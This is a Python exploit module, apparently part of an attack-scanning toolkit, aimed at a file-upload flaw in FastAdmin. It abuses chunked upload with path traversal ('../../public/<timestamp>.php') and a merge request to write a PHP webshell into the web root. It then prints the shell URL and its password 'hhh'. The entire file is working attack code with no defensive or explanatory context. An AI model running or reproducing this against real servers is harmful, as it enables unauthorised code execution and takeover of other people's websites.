#! /usr/bin/python3
# -*- encoding: utf-8 -*-

import requests
from time import time
from json import loads
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet

class FastAdminDirUploadScan:
    def upload_chunk(self,url):
        upload_url = url.rstrip('/') + '/index/ajax/upload'
        file = {
            'file': ('%d.php' % time(), open('./cve/FastAdmin/hhh.php', 'rb'), 'application/octet-stream')
        }
        chunk_id = time()
        data_ = {
            'chunkid': '../../public/%d.php' % chunk_id,
            'chunkindex': 0,
            'chunkcount': 1
        }
        resp = requests.post(
            upload_url,
            headers = self.headers,
            files = file,
            data = data_,
            verify=self.verify,
            proxies=self.proexis
        )
        result = loads(resp.text)
        if result['code'] == 1 and result['msg'] == '' and result['data'] == None:
            self.merge_file(upload_url, chunk_id)
            print('\nWebshell: %s/%d.php' % (url.rstrip('/'), chunk_id))
            OutPrintInfo("FastAdmin",'shell密码:[b bright_red]hhh[/b bright_red]')
        elif result['msg'] != '':
            OutPrintInfo("FastAdmin","Not Vulnerability.")
        else:
            OutPrintInfo("FastAdmin",'Not Vulnerability.')

    def merge_file(self,url, chunk_id):
        data_ = {
            'action': 'merge',
            'chunkid': '../../public/%d.php' % chunk_id,
            'chunkindex': 0,
            'chunkcount': 1,
            'filename': '%d.php-0.part' % chunk_id
        }
        resp = requests.post(
            url,
            headers = self.headers,
            data = data_,
            verify=self.verify,
            proxies=self.proexis

        )

    def main(self,target):
        url = target["url"].strip('/ ')
        head = target["header"]
        cookie = target["cookie"]
        self.verify = target["ssl"]
        proxy = target["proxy"]
        self.headers = {
            'User-Agent': head,
            'Cookie': cookie
        }
        _, self.proexis = ReqSet(proxy=proxy)
        try:
            self.upload_chunk(url)
        except Exception as e:
            OutPrintInfo("FastAdmin",'目标不存在漏洞')

